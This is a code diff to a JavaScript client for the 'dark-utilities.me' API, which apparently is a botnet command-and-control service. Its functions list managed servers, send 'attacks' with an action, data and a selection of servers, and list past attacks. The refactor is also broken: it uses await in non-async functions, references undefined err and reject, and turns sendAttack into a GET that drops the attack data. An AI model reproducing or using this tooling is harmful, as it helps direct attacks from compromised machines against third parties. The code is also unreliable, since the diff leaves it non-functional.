@@ -1,5 +1,5 @@
 
-var phin = require('phin').unpromisified;
+var phin = require('phin');
 
 /* Configuration */
 var hostname = "dark-utilities.me";
@@ -12,91 +12,84 @@ var header = {
 };
 
 const darkutilities = {
+
+    StatusApi: function () {
+        var res = await phin({
+            method: "GET",
+            url: 'https://' + hostname + '/api/v1/@me',
+            parse: 'json',
+            headers: header,
+         });
+         
+        if (err) return err;
+        return res.statusCode
+    },
+
     getUserInfo: function () {
-        return new Promise(function (resolve, reject) {
-            phin({
-                method: "GET",
-                url: 'https://' + hostname + '/api/v1/@me',
-                parse: 'json',
-                headers: header,
-            }, (err, res) => {
-                if (err) {
-                    reject(err);
-                }
-                resolve(res.body);
-            });
-        });
+        var res = await phin({
+            method: "GET",
+            url: 'https://' + hostname + '/api/v1/@me',
+            parse: 'json',
+            headers: header,
+         });
+         
+        if (err) return err;
+        return res.body
     },
     getServerList: function () {
-        return new Promise(function (resolve, reject) {
-            phin({
-                method: "GET",
-                url: 'https://' + hostname + '/api/v1/manager',
-                parse: 'json',
-                headers: header,
-            }, (err, res) => {
-                if (err) {
-                    reject(err);
-                }
-                resolve(res.body);
-            });
-        });
+        var res = await phin({
+            method: "GET",
+            url: 'https://' + hostname + '/api/v1/manager',
+            parse: 'json',
+            headers: header,
+         });
+         
+        if (err) return err;
+        return res.body
     },
     getServerInfo: function (server_digest) {
-        return new Promise(function (resolve, reject) {
-            if (server_digest == '') return reject('Server digest is empty');
-            phin({
-                method: "GET",
-                url: 'https://' + hostname + '/api/v1/servers/' + server_digest,
-                parse: 'json',
-                headers: header,
-            }, (err, res) => {
-                if (err) {
-                    reject(err);
-                }
-                resolve(res.body);
-            });
-        });
+        if (server_digest == '') return reject('Server digest is empty');
+        var res = await phin({
+            method: "GET",
+            url: 'https://' + hostname + '/api/v1/servers/' + server_digest,
+            parse: 'json',
+            headers: header,
+         });
+         
+        if (err) return err;
+        return res.body
     },
     sendAttack: function (action, data, selection) {
-        return new Promise(function (resolve, reject) {
-            if (action == '') return reject('Action is empty');
-            if (data == '') return reject('Data is empty');
+        if (action == '') return reject('Action is empty');
+        if (data == '') return reject('Data is empty');
             
-            phin({
-                method: "POST",
-                url: 'https://' + hostname + '/api/v1/manager',
-                parse: 'json',
-                headers: header,
-                data: {
-                    action: action,
-                    data: data,
-                    selection: selection,
-                }
-            }, (err, res) => {
-                if (err) {
-                    reject(err);
-                }
-                resolve(res.body);
-            });
-        });
+        var res = await phin({
+            method: "GET",
+            url: 'https://' + hostname + '/api/v1/manager',
+            parse: 'json',
+            headers: header,
+         });
+         
+        if (err) return err;
+        return res.body
     },
     getAttacks: function () {
-        return new Promise(function (resolve, reject) {
-            phin({
-                method: "GET",
-                url: 'https://' + hostname + '/api/v1/manager/attacks',
-                parse: 'json',
-                headers: header,
-            }, (err, res) => {
-                if (err) {
-                    reject(err);
-                }
-                resolve(res.body);
-            });
-        });
+        var res = await phin({
+            method: "GET",
+            url: 'https://' + hostname + '/api/v1/manager/attacks',
+            parse: 'json',
+            headers: header,
+         });
+         
+        if (err) return err;
+        return res.body
     }
 }
+
+// Return Status Code Api Key
+darkutilities.StatusApi().then(info => {
+    console.log(info);
+});
 
 // Return dict with account infos
 darkutilities.getUserInfo().then(info => {
